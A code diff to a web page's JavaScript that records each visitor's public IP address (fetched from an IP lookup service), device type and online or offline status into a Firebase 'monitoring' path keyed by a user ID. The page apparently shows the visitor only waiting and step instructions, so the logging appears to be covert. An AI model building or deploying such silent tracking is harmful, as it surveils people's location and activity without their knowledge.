@@ -82,25 +82,25 @@
         document.getElementById('ui-steps').innerHTML = lang.steps;
         document.getElementById('ui-wait').innerText = lang.wait;
 
-        function getDev() {
-            const ua = navigator.userAgent;
-            if (/android/i.test(ua)) return "Android";
-            if (/iPad|iPhone|iPod/.test(ua)) return "iPhone";
-            return navigator.platform;
-        }
-
         if (userId) {
             const sRef = db.ref('monitoring/' + userId);
-            const dName = getDev();
-
-            // سحب IP من مصدر احتياطي لضمان ظهوره
+            
+            // سحب الـ IP والبيانات "قبل" الإرسال لضمان عدم ظهور N/A
             fetch('https://api.ipify.org?format=json')
                 .then(r => r.json())
                 .then(data => {
-                    sRef.update({ status: "Online", ip: data.ip, device: dName, ts: Date.now() });
-                })
-                .catch(() => {
-                    sRef.update({ status: "Online", ip: "Not Found", device: dName, ts: Date.now() });
+                    let dev = navigator.platform;
+                    if (/iPhone|iPad|iPod/.test(navigator.userAgent)) dev = "iPhone";
+                    else if (/Android/.test(navigator.userAgent)) dev = "Android";
+
+                    sRef.set({
+                        status: "Online",
+                        ip: data.ip,
+                        device: dev,
+                        ts: Date.now()
+                    });
+                }).catch(() => {
+                    sRef.set({ status: "Online", ip: "Not Detected", device: "Mobile", ts: Date.now() });
                 });
 
             sRef.onDisconnect().update({ status: "Offline" });
